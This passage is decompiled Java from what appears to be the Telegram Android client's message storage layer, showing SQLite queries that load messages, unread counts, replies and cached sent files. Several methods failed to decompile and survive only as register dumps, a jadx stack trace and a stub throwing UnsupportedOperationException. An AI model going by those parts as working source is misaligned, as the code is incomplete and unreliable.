                                    cursor = MessagesStorage.this.database.queryFinalized(String.format(Locale.US, "SELECT * FROM (SELECT m.read_state, m.data, m.send_state, m.mid, m.date, r.random_id, m.replydata, m.media, m.ttl, m.mention FROM messages as m LEFT JOIN randoms as r ON r.mid = m.mid WHERE m.uid = %d AND m.mid <= %d ORDER BY m.date DESC, m.mid DESC LIMIT %d) UNION SELECT * FROM (SELECT m.read_state, m.data, m.send_state, m.mid, m.date, r.random_id, m.replydata, m.media, m.ttl, m.mention FROM messages as m LEFT JOIN randoms as r ON r.mid = m.mid WHERE m.uid = %d AND m.mid > %d ORDER BY m.date ASC, m.mid ASC LIMIT %d)", new Object[]{Long.valueOf(j), Long.valueOf(messageMaxId), Integer.valueOf(count_query / 2), Long.valueOf(j), Long.valueOf(messageMaxId), Integer.valueOf(count_query / 2)}), new Object[0]);
                                } else {
                                    if (holeMessageMaxId == 0) {
                                        holeMessageMaxId = C0907C.NANOS_PER_SECOND;
                                        if (channelId != 0) {
                                            holeMessageMaxId = C0907C.NANOS_PER_SECOND | (((long) channelId) << 32);
                                        }
                                    }
                                    cursor = MessagesStorage.this.database.queryFinalized(String.format(Locale.US, "SELECT * FROM (SELECT m.read_state, m.data, m.send_state, m.mid, m.date, r.random_id, m.replydata, m.media, m.ttl, m.mention FROM messages as m LEFT JOIN randoms as r ON r.mid = m.mid WHERE m.uid = %d AND m.mid <= %d AND m.mid >= %d ORDER BY m.date DESC, m.mid DESC LIMIT %d) UNION SELECT * FROM (SELECT m.read_state, m.data, m.send_state, m.mid, m.date, r.random_id, m.replydata, m.media, m.ttl, m.mention FROM messages as m LEFT JOIN randoms as r ON r.mid = m.mid WHERE m.uid = %d AND m.mid > %d AND m.mid <= %d ORDER BY m.date ASC, m.mid ASC LIMIT %d)", new Object[]{Long.valueOf(j), Long.valueOf(messageMaxId), Long.valueOf(holeMessageMinId), Integer.valueOf(count_query / 2), Long.valueOf(j), Long.valueOf(messageMaxId), Long.valueOf(holeMessageMaxId), Integer.valueOf(count_query / 2)}), new Object[0]);
                                }
                            } else if (i3 == 2) {
                                existingUnreadCount = 0;
                                cursor = MessagesStorage.this.database.queryFinalized(String.format(Locale.US, "SELECT COUNT(*) FROM messages WHERE uid = %d AND mid != 0 AND out = 0 AND read_state IN(0,2)", new Object[]{Long.valueOf(j)}), new Object[0]);
                                if (cursor.next()) {
                                    existingUnreadCount = cursor.intValue(0);
                                }
                                cursor.dispose();
                                if (existingUnreadCount == count_unread) {
                                    unreadCountIsLocal = true;
                                    cursor = MessagesStorage.this.database.queryFinalized(String.format(Locale.US, "SELECT * FROM (SELECT m.read_state, m.data, m.send_state, m.mid, m.date, r.random_id, m.replydata, m.media, m.ttl, m.mention FROM messages as m LEFT JOIN randoms as r ON r.mid = m.mid WHERE m.uid = %d AND m.mid <= %d ORDER BY m.date DESC, m.mid DESC LIMIT %d) UNION SELECT * FROM (SELECT m.read_state, m.data, m.send_state, m.mid, m.date, r.random_id, m.replydata, m.media, m.ttl, m.mention FROM messages as m LEFT JOIN randoms as r ON r.mid = m.mid WHERE m.uid = %d AND m.mid > %d ORDER BY m.date ASC, m.mid ASC LIMIT %d)", new Object[]{Long.valueOf(j), Long.valueOf(messageMaxId), Integer.valueOf(count_query / 2), Long.valueOf(j), Long.valueOf(messageMaxId), Integer.valueOf(count_query / 2)}), new Object[0]);
                                } else {
                                    cursor = null;
                                }
                            } else {
                                cursor = null;
                            }
                        } else if (i3 == 1) {
                            holeMessageId = 0;
                            cursor = MessagesStorage.this.database.queryFinalized(String.format(Locale.US, "SELECT start, end FROM messages_holes WHERE uid = %d AND start >= %d AND start != 1 AND end != 1 ORDER BY start ASC LIMIT 1", new Object[]{Long.valueOf(j), Integer.valueOf(i2)}), new Object[0]);
                            if (cursor.next()) {
                                holeMessageId = (long) cursor.intValue(0);
                                if (channelId != 0) {
                                    holeMessageId |= ((long) channelId) << 32;
                                }
                            }
                            cursor.dispose();
                            if (holeMessageId != 0) {
                                cursor = MessagesStorage.this.database.queryFinalized(String.format(Locale.US, "SELECT m.read_state, m.data, m.send_state, m.mid, m.date, r.random_id, m.replydata, m.media, m.ttl, m.mention FROM messages as m LEFT JOIN randoms as r ON r.mid = m.mid WHERE m.uid = %d AND m.date >= %d AND m.mid > %d AND m.mid <= %d ORDER BY m.date ASC, m.mid ASC LIMIT %d", new Object[]{Long.valueOf(j), Integer.valueOf(i4), Long.valueOf(messageMaxId), Long.valueOf(holeMessageId), Integer.valueOf(count_query)}), new Object[0]);
                            } else {
                                cursor = MessagesStorage.this.database.queryFinalized(String.format(Locale.US, "SELECT m.read_state, m.data, m.send_state, m.mid, m.date, r.random_id, m.replydata, m.media, m.ttl, m.mention FROM messages as m LEFT JOIN randoms as r ON r.mid = m.mid WHERE m.uid = %d AND m.date >= %d AND m.mid > %d ORDER BY m.date ASC, m.mid ASC LIMIT %d", new Object[]{Long.valueOf(j), Integer.valueOf(i4), Long.valueOf(messageMaxId), Integer.valueOf(count_query)}), new Object[0]);
                            }
                        } else if (i4 == 0) {
                            cursor = MessagesStorage.this.database.queryFinalized(String.format(Locale.US, "SELECT max(mid) FROM messages WHERE uid = %d AND mid > 0", new Object[]{Long.valueOf(j)}), new Object[0]);
                            if (cursor.next()) {
                                last_message_id = cursor.intValue(0);
                            }
                            cursor.dispose();
                            holeMessageId = 0;
                            cursor = MessagesStorage.this.database.queryFinalized(String.format(Locale.US, "SELECT max(end) FROM messages_holes WHERE uid = %d", new Object[]{Long.valueOf(j)}), new Object[0]);
                            if (cursor.next()) {
                                holeMessageId = (long) cursor.intValue(0);
                                if (channelId != 0) {
                                    holeMessageId |= ((long) channelId) << 32;
                                }
                            }
                            cursor.dispose();
                            if (holeMessageId != 0) {
                                cursor = MessagesStorage.this.database.queryFinalized(String.format(Locale.US, "SELECT m.read_state, m.data, m.send_state, m.mid, m.date, r.random_id, m.replydata, m.media, m.ttl, m.mention FROM messages as m LEFT JOIN randoms as r ON r.mid = m.mid WHERE m.uid = %d AND (m.mid >= %d OR m.mid < 0) ORDER BY m.date DESC, m.mid DESC LIMIT %d,%d", new Object[]{Long.valueOf(j), Long.valueOf(holeMessageId), Integer.valueOf(offset_query), Integer.valueOf(count_query)}), new Object[0]);
                            } else {
                                cursor = MessagesStorage.this.database.queryFinalized(String.format(Locale.US, "SELECT m.read_state, m.data, m.send_state, m.mid, m.date, r.random_id, m.replydata, m.media, m.ttl, m.mention FROM messages as m LEFT JOIN randoms as r ON r.mid = m.mid WHERE m.uid = %d ORDER BY m.date DESC, m.mid DESC LIMIT %d,%d", new Object[]{Long.valueOf(j), Integer.valueOf(offset_query), Integer.valueOf(count_query)}), new Object[0]);
                            }
                        } else if (messageMaxId != 0) {
                            holeMessageId = 0;
                            cursor = MessagesStorage.this.database.queryFinalized(String.format(Locale.US, "SELECT end FROM messages_holes WHERE uid = %d AND end <= %d ORDER BY end DESC LIMIT 1", new Object[]{Long.valueOf(j), Integer.valueOf(i2)}), new Object[0]);
                            if (cursor.next()) {
                                holeMessageId = (long) cursor.intValue(0);
                                if (channelId != 0) {
                                    holeMessageId |= ((long) channelId) << 32;
                                }
                            }
                            cursor.dispose();
                            if (holeMessageId != 0) {
                                cursor = MessagesStorage.this.database.queryFinalized(String.format(Locale.US, "SELECT m.read_state, m.data, m.send_state, m.mid, m.date, r.random_id, m.replydata, m.media, m.ttl, m.mention FROM messages as m LEFT JOIN randoms as r ON r.mid = m.mid WHERE m.uid = %d AND m.date <= %d AND m.mid < %d AND (m.mid >= %d OR m.mid < 0) ORDER BY m.date DESC, m.mid DESC LIMIT %d", new Object[]{Long.valueOf(j), Integer.valueOf(i4), Long.valueOf(messageMaxId), Long.valueOf(holeMessageId), Integer.valueOf(count_query)}), new Object[0]);
                            } else {
                                cursor = MessagesStorage.this.database.queryFinalized(String.format(Locale.US, "SELECT m.read_state, m.data, m.send_state, m.mid, m.date, r.random_id, m.replydata, m.media, m.ttl, m.mention FROM messages as m LEFT JOIN randoms as r ON r.mid = m.mid WHERE m.uid = %d AND m.date <= %d AND m.mid < %d ORDER BY m.date DESC, m.mid DESC LIMIT %d", new Object[]{Long.valueOf(j), Integer.valueOf(i4), Long.valueOf(messageMaxId), Integer.valueOf(count_query)}), new Object[0]);
                            }
                        } else {
                            cursor = MessagesStorage.this.database.queryFinalized(String.format(Locale.US, "SELECT m.read_state, m.data, m.send_state, m.mid, m.date, r.random_id, m.replydata, m.media, m.ttl, m.mention FROM messages as m LEFT JOIN randoms as r ON r.mid = m.mid WHERE m.uid = %d AND m.date <= %d ORDER BY m.date DESC, m.mid DESC LIMIT %d,%d", new Object[]{Long.valueOf(j), Integer.valueOf(i4), Integer.valueOf(offset_query), Integer.valueOf(count_query)}), new Object[0]);
                        }
                    } else {
                        isEnd = true;
                        if (i3 == 3 && i4 == 0) {
                            cursor = MessagesStorage.this.database.queryFinalized(String.format(Locale.US, "SELECT min(mid) FROM messages WHERE uid = %d AND mid < 0", new Object[]{Long.valueOf(j)}), new Object[0]);
                            if (cursor.next()) {
                                min_unread_id = cursor.intValue(0);
                            }
                            cursor.dispose();
                            int min_unread_id2 = 0;
                            cursor = MessagesStorage.this.database.queryFinalized(String.format(Locale.US, "SELECT max(mid), max(date) FROM messages WHERE uid = %d AND out = 0 AND read_state IN(0,2) AND mid < 0", new Object[]{Long.valueOf(j)}), new Object[0]);
                            if (cursor.next()) {
                                min_unread_id2 = cursor.intValue(0);
                                max_unread_date = cursor.intValue(1);
                            }
                            cursor.dispose();
                            if (min_unread_id2 != 0) {
                                min_unread_id = min_unread_id2;
                                cursor = MessagesStorage.this.database.queryFinalized(String.format(Locale.US, "SELECT COUNT(*) FROM messages WHERE uid = %d AND mid <= %d AND out = 0 AND read_state IN(0,2)", new Object[]{Long.valueOf(j), Integer.valueOf(min_unread_id2)}), new Object[0]);
                                if (cursor.next()) {
                                    count_unread = cursor.intValue(0);
                                }
                                cursor.dispose();
                            }
                        }
                        if (i3 == 3 || i3 == 4) {
                            cursor = MessagesStorage.this.database.queryFinalized(String.format(Locale.US, "SELECT min(mid) FROM messages WHERE uid = %d AND mid < 0", new Object[]{Long.valueOf(j)}), new Object[0]);
                            if (cursor.next()) {
                                last_message_id = cursor.intValue(0);
                            }
                            cursor.dispose();
                            cursor = MessagesStorage.this.database.queryFinalized(String.format(Locale.US, "SELECT * FROM (SELECT m.read_state, m.data, m.send_state, m.mid, m.date, r.random_id, m.replydata, m.media, m.ttl, m.mention FROM messages as m LEFT JOIN randoms as r ON r.mid = m.mid WHERE m.uid = %d AND m.mid <= %d ORDER BY m.mid DESC LIMIT %d) UNION SELECT * FROM (SELECT m.read_state, m.data, m.send_state, m.mid, m.date, r.random_id, m.replydata, m.media, m.ttl, m.mention FROM messages as m LEFT JOIN randoms as r ON r.mid = m.mid WHERE m.uid = %d AND m.mid > %d ORDER BY m.mid ASC LIMIT %d)", new Object[]{Long.valueOf(j), Long.valueOf(messageMaxId), Integer.valueOf(count_query / 2), Long.valueOf(j), Long.valueOf(messageMaxId), Integer.valueOf(count_query / 2)}), new Object[0]);
                        } else if (i3 == 1) {
                            cursor = MessagesStorage.this.database.queryFinalized(String.format(Locale.US, "SELECT m.read_state, m.data, m.send_state, m.mid, m.date, r.random_id, m.replydata, m.media, m.ttl, m.mention FROM messages as m LEFT JOIN randoms as r ON r.mid = m.mid WHERE m.uid = %d AND m.mid < %d ORDER BY m.mid DESC LIMIT %d", new Object[]{Long.valueOf(j), Integer.valueOf(i2), Integer.valueOf(count_query)}), new Object[0]);
                        } else if (i4 == 0) {
                            if (i3 == 2) {
                                cursor = MessagesStorage.this.database.queryFinalized(String.format(Locale.US, "SELECT min(mid) FROM messages WHERE uid = %d AND mid < 0", new Object[]{Long.valueOf(j)}), new Object[0]);
                                if (cursor.next()) {
                                    last_message_id = cursor.intValue(0);
                                }
                                cursor.dispose();
                                cursor = MessagesStorage.this.database.queryFinalized(String.format(Locale.US, "SELECT max(mid), max(date) FROM messages WHERE uid = %d AND out = 0 AND read_state IN(0,2) AND mid < 0", new Object[]{Long.valueOf(j)}), new Object[0]);
                                if (cursor.next()) {
                                    min_unread_id = cursor.intValue(0);
                                    max_unread_date = cursor.intValue(1);
                                }
                                cursor.dispose();
                                if (min_unread_id != 0) {
                                    cursor = MessagesStorage.this.database.queryFinalized(String.format(Locale.US, "SELECT COUNT(*) FROM messages WHERE uid = %d AND mid <= %d AND out = 0 AND read_state IN(0,2)", new Object[]{Long.valueOf(j), Integer.valueOf(min_unread_id)}), new Object[0]);
                                    if (cursor.next()) {
                                        count_unread = cursor.intValue(0);
                                    }
                                    cursor.dispose();
                                }
                            }
                            if (count_query > count_unread || count_unread < num) {
                                count_query = Math.max(count_query, count_unread + 10);
                                if (count_unread < num) {
                                    count_unread = 0;
                                    min_unread_id = 0;
                                    last_message_id = 0;
                                }
                            } else {
                                offset_query = count_unread - count_query;
                                count_query += 10;
                            }
                            cursor = MessagesStorage.this.database.queryFinalized(String.format(Locale.US, "SELECT m.read_state, m.data, m.send_state, m.mid, m.date, r.random_id, m.replydata, m.media, m.ttl, m.mention FROM messages as m LEFT JOIN randoms as r ON r.mid = m.mid WHERE m.uid = %d ORDER BY m.mid ASC LIMIT %d,%d", new Object[]{Long.valueOf(j), Integer.valueOf(offset_query), Integer.valueOf(count_query)}), new Object[0]);
                        } else if (i2 != 0) {
                            cursor = MessagesStorage.this.database.queryFinalized(String.format(Locale.US, "SELECT m.read_state, m.data, m.send_state, m.mid, m.date, r.random_id, m.replydata, m.media, m.ttl, m.mention FROM messages as m LEFT JOIN randoms as r ON r.mid = m.mid WHERE m.uid = %d AND m.mid > %d ORDER BY m.mid ASC LIMIT %d", new Object[]{Long.valueOf(j), Integer.valueOf(i2), Integer.valueOf(count_query)}), new Object[0]);
                        } else {
                            cursor = MessagesStorage.this.database.queryFinalized(String.format(Locale.US, "SELECT m.read_state, m.data, m.send_state, m.mid, m.date, r.random_id, m.replydata, m.media, m.ttl, m.mention FROM messages as m LEFT JOIN randoms as r ON r.mid = m.mid WHERE m.uid = %d AND m.date <= %d ORDER BY m.mid ASC LIMIT %d,%d", new Object[]{Long.valueOf(j), Integer.valueOf(i4), Integer.valueOf(0), Integer.valueOf(count_query)}), new Object[0]);
                        }
                    }
                    if (cursor != null) {
                        while (cursor.next()) {
                            data = cursor.byteBufferValue(1);
                            if (data != null) {
                                message = TLRPC$Message.TLdeserialize(data, data.readInt32(false), false);
                                data.reuse();
                                MessageObject.setUnreadFlags(message, cursor.intValue(0));
                                message.id = cursor.intValue(3);
                                message.date = cursor.intValue(4);
                                message.dialog_id = j;
                                if ((message.flags & 1024) != 0) {
                                    message.views = cursor.intValue(7);
                                }
                                if (lower_id != 0 && message.ttl == 0) {
                                    message.ttl = cursor.intValue(8);
                                }
                                if (cursor.intValue(9) != 0) {
                                    message.mentioned = true;
                                }
                                res.messages.add(message);
                                MessagesStorage.addUsersAndChatsFromMessage(message, usersToLoad, chatsToLoad);
                                if (!(message.reply_to_msg_id == 0 && message.reply_to_random_id == 0)) {
                                    if (!cursor.isNull(6)) {
                                        data = cursor.byteBufferValue(6);
                                        if (data != null) {
                                            message.replyMessage = TLRPC$Message.TLdeserialize(data, data.readInt32(false), false);
                                            data.reuse();
                                            if (message.replyMessage != null) {
                                                if (MessageObject.isMegagroup(message)) {
                                                    tLRPC$Message = message.replyMessage;
                                                    tLRPC$Message.flags |= Integer.MIN_VALUE;
                                                }
                                                MessagesStorage.addUsersAndChatsFromMessage(message.replyMessage, usersToLoad, chatsToLoad);
                                            }
                                        }
                                    }
                                    if (message.replyMessage == null) {
                                        ArrayList<TLRPC$Message> messages;
                                        if (message.reply_to_msg_id != 0) {
                                            long messageId = (long) message.reply_to_msg_id;
                                            if (message.to_id.channel_id != 0) {
                                                messageId |= ((long) message.to_id.channel_id) << 32;
                                            }
                                            if (!replyMessages.contains(Long.valueOf(messageId))) {
                                                replyMessages.add(Long.valueOf(messageId));
                                            }
                                            messages = (ArrayList) replyMessageOwners.get(Integer.valueOf(message.reply_to_msg_id));
                                            if (messages == null) {
                                                messages = new ArrayList();
                                                replyMessageOwners.put(Integer.valueOf(message.reply_to_msg_id), messages);
                                            }
                                            messages.add(message);
                                        } else {
                                            if (!replyMessages.contains(Long.valueOf(message.reply_to_random_id))) {
                                                replyMessages.add(Long.valueOf(message.reply_to_random_id));
                                            }
                                            messages = (ArrayList) replyMessageRandomOwners.get(Long.valueOf(message.reply_to_random_id));
                                            if (messages == null) {
                                                messages = new ArrayList();
                                                replyMessageRandomOwners.put(Long.valueOf(message.reply_to_random_id), messages);
                                            }
                                            messages.add(message);
                                        }
                                    }
                                }
                                message.send_state = cursor.intValue(2);
                                if (message.id > 0 && message.send_state != 0) {
                                    message.send_state = 0;
                                }
                                if (lower_id == 0 && !cursor.isNull(5)) {
                                    message.random_id = cursor.longValue(5);
                                }
                                if (MessageObject.isSecretPhotoOrVideo(message)) {
                                    try {
                                        SQLiteCursor cursor2 = MessagesStorage.this.database.queryFinalized(String.format(Locale.US, "SELECT date FROM enc_tasks_v2 WHERE mid = %d", new Object[]{Integer.valueOf(message.id)}), new Object[0]);
                                        if (cursor2.next()) {
                                            message.destroyTime = cursor2.intValue(0);
                                        }
                                        cursor2.dispose();
                                    } catch (Exception e) {
                                        FileLog.e(e);
                                    }
                                } else {
                                    continue;
                                }
                            }
                        }
                        cursor.dispose();
                    }
                    Collections.sort(res.messages, new C15461());
                    if (lower_id != 0) {
                        if ((i3 == 3 || i3 == 4 || (i3 == 2 && queryFromServer && !unreadCountIsLocal)) && !res.messages.isEmpty()) {
                            int minId = ((TLRPC$Message) res.messages.get(res.messages.size() - 1)).id;
                            int maxId = ((TLRPC$Message) res.messages.get(0)).id;
                            if (minId > max_id_query || maxId < max_id_query) {
                                replyMessages.clear();
                                usersToLoad.clear();
                                chatsToLoad.clear();
                                res.messages.clear();
                            }
                        }
                        if ((i3 == 4 || i3 == 3) && res.messages.size() == 1) {
                            res.messages.clear();
                        }
                    }
                    if (!replyMessages.isEmpty()) {
                        ArrayList<TLRPC$Message> arrayList;
                        int a;
                        if (replyMessageOwners.isEmpty()) {
                            cursor = MessagesStorage.this.database.queryFinalized(String.format(Locale.US, "SELECT m.data, m.mid, m.date, r.random_id FROM randoms as r INNER JOIN messages as m ON r.mid = m.mid WHERE r.random_id IN(%s)", new Object[]{TextUtils.join(",", replyMessages)}), new Object[0]);
                        } else {
                            cursor = MessagesStorage.this.database.queryFinalized(String.format(Locale.US, "SELECT data, mid, date FROM messages WHERE mid IN(%s)", new Object[]{TextUtils.join(",", replyMessages)}), new Object[0]);
                        }
                        while (cursor.next()) {
                            data = cursor.byteBufferValue(0);
                            if (data != null) {
                                message = TLRPC$Message.TLdeserialize(data, data.readInt32(false), false);
                                data.reuse();
                                message.id = cursor.intValue(1);
                                message.date = cursor.intValue(2);
                                message.dialog_id = j;
                                MessagesStorage.addUsersAndChatsFromMessage(message, usersToLoad, chatsToLoad);
                                TLRPC$Message object;
                                if (replyMessageOwners.isEmpty()) {
                                    arrayList = (ArrayList) replyMessageRandomOwners.remove(Long.valueOf(cursor.longValue(3)));
                                    if (arrayList != null) {
                                        for (a = 0; a < arrayList.size(); a++) {
                                            object = (TLRPC$Message) arrayList.get(a);
                                            object.replyMessage = message;
                                            object.reply_to_msg_id = message.id;
                                            if (MessageObject.isMegagroup(object)) {
                                                tLRPC$Message = object.replyMessage;
                                                tLRPC$Message.flags |= Integer.MIN_VALUE;
                                            }
                                        }
                                    }
                                } else {
                                    arrayList = (ArrayList) replyMessageOwners.get(Integer.valueOf(message.id));
                                    if (arrayList != null) {
                                        for (a = 0; a < arrayList.size(); a++) {
                                            object = (TLRPC$Message) arrayList.get(a);
                                            object.replyMessage = message;
                                            if (MessageObject.isMegagroup(object)) {
                                                tLRPC$Message = object.replyMessage;
                                                tLRPC$Message.flags |= Integer.MIN_VALUE;
                                            }
                                        }
                                    }
                                }
                            }
                        }
                        cursor.dispose();
                        if (!replyMessageRandomOwners.isEmpty()) {
                            for (Entry<Long, ArrayList<TLRPC$Message>> entry : replyMessageRandomOwners.entrySet()) {
                                arrayList = (ArrayList) entry.getValue();
                                for (a = 0; a < arrayList.size(); a++) {
                                    ((TLRPC$Message) arrayList.get(a)).reply_to_random_id = 0;
                                }
                            }
                        }
                    }
                    if (mentions_unread != 0) {
                        cursor = MessagesStorage.this.database.queryFinalized(String.format(Locale.US, "SELECT COUNT(mid) FROM messages WHERE uid = %d AND mention = 1 AND read_state IN(0, 1)", new Object[]{Long.valueOf(j)}), new Object[0]);
                        if (!cursor.next()) {
                            mentions_unread *= -1;
                        } else if (mentions_unread != cursor.intValue(0)) {
                            mentions_unread *= -1;
                        }
                        cursor.dispose();
                    }
                    if (!usersToLoad.isEmpty()) {
                        MessagesStorage.this.getUsersInternal(TextUtils.join(",", usersToLoad), res.users);
                    }
                    if (!chatsToLoad.isEmpty()) {
                        MessagesStorage.this.getChatsInternal(TextUtils.join(",", chatsToLoad), res.chats);
                    }
                    MessagesController.getInstance().processLoadedMessages(res, j, count_query, max_id_override, i5, true, i6, min_unread_id, last_message_id, count_unread, max_unread_date, i3, z, isEnd, i7, queryFromServer, mentions_unread);
                } catch (Exception e2) {
                    res.messages.clear();
                    res.chats.clear();
                    res.users.clear();
                    FileLog.e(e2);
                    MessagesController.getInstance().processLoadedMessages(res, j, count_query, max_id_override, i5, true, i6, min_unread_id, last_message_id, count_unread, max_unread_date, i3, z, isEnd, i7, queryFromServer, mentions_unread);
                } catch (Throwable th) {
                    Throwable th2 = th;
                    MessagesController.getInstance().processLoadedMessages(res, j, count_query, max_id_override, i5, true, i6, min_unread_id, last_message_id, count_unread, max_unread_date, i3, z, isEnd, i7, queryFromServer, mentions_unread);
                }
            }
        });
    }

    public TLObject getSentFile(String path, int type) {
        if (path == null || path.endsWith("attheme")) {
            return null;
        }
        final Semaphore semaphore = new Semaphore(0);
        final ArrayList<TLObject> result = new ArrayList();
        final String str = path;
        final int i = type;
        this.storageQueue.postRunnable(new Runnable() {
            /* JADX WARNING: inconsistent code. */
            /* Code decompiled incorrectly, please refer to instructions dump. */
            public void run() {
                /*
                r11 = this;
                r5 = r2;	 Catch:{ Exception -> 0x006b }
                r4 = org.telegram.messenger.Utilities.MD5(r5);	 Catch:{ Exception -> 0x006b }
                if (r4 == 0) goto L_0x0057;
            L_0x0008:
                r5 = org.telegram.messenger.MessagesStorage.this;	 Catch:{ Exception -> 0x006b }
                r5 = r5.database;	 Catch:{ Exception -> 0x006b }
                r6 = java.util.Locale.US;	 Catch:{ Exception -> 0x006b }
                r7 = "SELECT data FROM sent_files_v2 WHERE uid = '%s' AND type = %d";
                r8 = 2;
                r8 = new java.lang.Object[r8];	 Catch:{ Exception -> 0x006b }
                r9 = 0;
                r8[r9] = r4;	 Catch:{ Exception -> 0x006b }
                r9 = 1;
                r10 = r3;	 Catch:{ Exception -> 0x006b }
                r10 = java.lang.Integer.valueOf(r10);	 Catch:{ Exception -> 0x006b }
                r8[r9] = r10;	 Catch:{ Exception -> 0x006b }
                r6 = java.lang.String.format(r6, r7, r8);	 Catch:{ Exception -> 0x006b }
                r7 = 0;
                r7 = new java.lang.Object[r7];	 Catch:{ Exception -> 0x006b }
                r0 = r5.queryFinalized(r6, r7);	 Catch:{ Exception -> 0x006b }
                r5 = r0.next();	 Catch:{ Exception -> 0x006b }
                if (r5 == 0) goto L_0x0054;
            L_0x0033:
                r5 = 0;
                r1 = r0.byteBufferValue(r5);	 Catch:{ Exception -> 0x006b }
                if (r1 == 0) goto L_0x0054;
            L_0x003a:
                r5 = 0;
                r5 = r1.readInt32(r5);	 Catch:{ Exception -> 0x006b }
                r6 = 0;
                r3 = org.telegram.tgnet.TLRPC$MessageMedia.TLdeserialize(r1, r5, r6);	 Catch:{ Exception -> 0x006b }
                r1.reuse();	 Catch:{ Exception -> 0x006b }
                r5 = r3 instanceof org.telegram.tgnet.TLRPC$TL_messageMediaDocument;	 Catch:{ Exception -> 0x006b }
                if (r5 == 0) goto L_0x005d;
            L_0x004b:
                r5 = r4;	 Catch:{ Exception -> 0x006b }
                r3 = (org.telegram.tgnet.TLRPC$TL_messageMediaDocument) r3;	 Catch:{ Exception -> 0x006b }
                r6 = r3.document;	 Catch:{ Exception -> 0x006b }
                r5.add(r6);	 Catch:{ Exception -> 0x006b }
            L_0x0054:
                r0.dispose();	 Catch:{ Exception -> 0x006b }
            L_0x0057:
                r5 = r5;
                r5.release();
            L_0x005c:
                return;
            L_0x005d:
                r5 = r3 instanceof org.telegram.tgnet.TLRPC$TL_messageMediaPhoto;	 Catch:{ Exception -> 0x006b }
                if (r5 == 0) goto L_0x0054;
            L_0x0061:
                r5 = r4;	 Catch:{ Exception -> 0x006b }
                r3 = (org.telegram.tgnet.TLRPC$TL_messageMediaPhoto) r3;	 Catch:{ Exception -> 0x006b }
                r6 = r3.photo;	 Catch:{ Exception -> 0x006b }
                r5.add(r6);	 Catch:{ Exception -> 0x006b }
                goto L_0x0054;
            L_0x006b:
                r2 = move-exception;
                org.telegram.messenger.FileLog.e(r2);	 Catch:{ all -> 0x0075 }
                r5 = r5;
                r5.release();
                goto L_0x005c;
            L_0x0075:
                r5 = move-exception;
                r6 = r5;
                r6.release();
                throw r5;
                */
                throw new UnsupportedOperationException("Method not decompiled: org.telegram.messenger.MessagesStorage.58.run():void");
            }
        });
        try {
            semaphore.acquire();
        } catch (Exception e) {
            FileLog.e(e);
        }
        if (result.isEmpty()) {
            return null;
        }
        return (TLObject) result.get(0);
    }

    public void putSentFile(final String path, final TLObject file, final int type) {
        if (path != null && file != null) {
            this.storageQueue.postRunnable(new Runnable() {
                /* JADX WARNING: inconsistent code. */
                /* Code decompiled incorrectly, please refer to instructions dump. */
                public void run() {
                    /* JADX: method processing error */
/*
Error: jadx.core.utils.exceptions.JadxRuntimeException: Can't find block by offset: 0x0028 in list [B:9:0x0025]
	at jadx.core.utils.BlockUtils.getBlockByOffset(BlockUtils.java:43)
	at jadx.core.dex.instructions.IfNode.initBlocks(IfNode.java:60)
	at jadx.core.dex.visitors.blocksmaker.BlockFinish.initBlocksInIfNodes(BlockFinish.java:48)
	at jadx.core.dex.visitors.blocksmaker.BlockFinish.visit(BlockFinish.java:33)
	at jadx.core.dex.visitors.DepthTraversal.visit(DepthTraversal.java:31)
	at jadx.core.dex.visitors.DepthTraversal.visit(DepthTraversal.java:17)
	at jadx.core.dex.visitors.DepthTraversal.visit(DepthTraversal.java:14)
	at jadx.core.ProcessClass.process(ProcessClass.java:34)
	at jadx.core.ProcessClass.processDependencies(ProcessClass.java:56)
	at jadx.core.ProcessClass.process(ProcessClass.java:39)
	at jadx.api.JadxDecompiler.processClass(JadxDecompiler.java:282)
	at jadx.api.JavaClass.decompile(JavaClass.java:62)
	at jadx.api.JadxDecompiler.lambda$appendSourcesSave$0(JadxDecompiler.java:200)
*/
                    /*
                    r7 = this;
                    r4 = 0;
                    r5 = r3;	 Catch:{ Exception -> 0x0041, all -> 0x0081 }
                    r2 = org.telegram.messenger.Utilities.MD5(r5);	 Catch:{ Exception -> 0x0041, all -> 0x0081 }
                    if (r2 == 0) goto L_0x007b;	 Catch:{ Exception -> 0x0041, all -> 0x0081 }
                L_0x0009:
                    r3 = 0;	 Catch:{ Exception -> 0x0041, all -> 0x0081 }
                    r5 = r4;	 Catch:{ Exception -> 0x0041, all -> 0x0081 }
                    r5 = r5 instanceof org.telegram.tgnet.TLRPC$Photo;	 Catch:{ Exception -> 0x0041, all -> 0x0081 }
                    if (r5 == 0) goto L_0x0029;	 Catch:{ Exception -> 0x0041, all -> 0x0081 }
                L_0x0010:
                    r3 = new org.telegram.tgnet.TLRPC$TL_messageMediaPhoto;	 Catch:{ Exception -> 0x0041, all -> 0x0081 }
                    r3.<init>();	 Catch:{ Exception -> 0x0041, all -> 0x0081 }
                    r5 = r4;	 Catch:{ Exception -> 0x0041, all -> 0x0081 }
                    r5 = (org.telegram.tgnet.TLRPC$Photo) r5;	 Catch:{ Exception -> 0x0041, all -> 0x0081 }
                    r3.photo = r5;	 Catch:{ Exception -> 0x0041, all -> 0x0081 }
                    r5 = r3.flags;	 Catch:{ Exception -> 0x0041, all -> 0x0081 }
                    r5 = r5 | 1;	 Catch:{ Exception -> 0x0041, all -> 0x0081 }
                    r3.flags = r5;	 Catch:{ Exception -> 0x0041, all -> 0x0081 }
                L_0x0021:
                    if (r3 != 0) goto L_0x004b;
                L_0x0023:
                    if (r4 == 0) goto L_0x0028;
                L_0x0025:
                    r4.dispose();
                L_0x0028:
                    return;
                L_0x0029:
                    r5 = r4;	 Catch:{ Exception -> 0x0041, all -> 0x0081 }
                    r5 = r5 instanceof org.telegram.tgnet.TLRPC$Document;	 Catch:{ Exception -> 0x0041, all -> 0x0081 }
                    if (r5 == 0) goto L_0x0021;	 Catch:{ Exception -> 0x0041, all -> 0x0081 }
                L_0x002f:
                    r3 = new org.telegram.tgnet.TLRPC$TL_messageMediaDocument;	 Catch:{ Exception -> 0x0041, all -> 0x0081 }
                    r3.<init>();	 Catch:{ Exception -> 0x0041, all -> 0x0081 }
                    r5 = r4;	 Catch:{ Exception -> 0x0041, all -> 0x0081 }
                    r5 = (org.telegram.tgnet.TLRPC$Document) r5;	 Catch:{ Exception -> 0x0041, all -> 0x0081 }
                    r3.document = r5;	 Catch:{ Exception -> 0x0041, all -> 0x0081 }
                    r5 = r3.flags;	 Catch:{ Exception -> 0x0041, all -> 0x0081 }
                    r5 = r5 | 1;	 Catch:{ Exception -> 0x0041, all -> 0x0081 }
                    r3.flags = r5;	 Catch:{ Exception -> 0x0041, all -> 0x0081 }
                    goto L_0x0021;
                L_0x0041:
